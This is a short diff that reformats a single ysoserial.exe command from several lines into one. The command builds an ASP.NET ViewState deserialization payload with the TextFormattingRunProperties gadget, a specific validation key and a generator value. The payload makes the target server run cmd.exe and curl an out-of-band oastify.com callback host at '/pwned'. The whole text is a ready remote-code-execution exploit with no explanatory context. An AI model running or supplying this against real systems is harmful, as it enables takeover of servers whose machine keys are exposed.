@@ -1,7 +1,1 @@
-ysoserial.exe -p ViewState -g TextFormattingRunProperties `
-  -c "cmd.exe /c curl -sk https://i43on51k36mb3fq6a1ehtop5qwwpkf84.oastify.com/pwned" `
-  --generator="4E85D818" `
-  --islegacy `
-  --validationalg="HMACSHA256" `
-  --validationkey="C50B3C89CB21F4F1422FF158A5B42D0E8DB8CB5CDA1742572A487D9401E3400267682B202B746511891C1BAF47F8D25C07F6C39A104696DB51F17C529AD3CABE" `
-  -o base64
+ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd.exe /c curl -sk https://i43on51k36mb3fq6a1ehtop5qwwpkf84.oastify.com/pwned" --generator="4E85D818" --islegacy --validationalg="HMACSHA256" --validationkey="C50B3C89CB21F4F1422FF158A5B42D0E8DB8CB5CDA1742572A487D9401E3400267682B202B746511891C1BAF47F8D25C07F6C39A104696DB51F17C529AD3CABE" -o base64
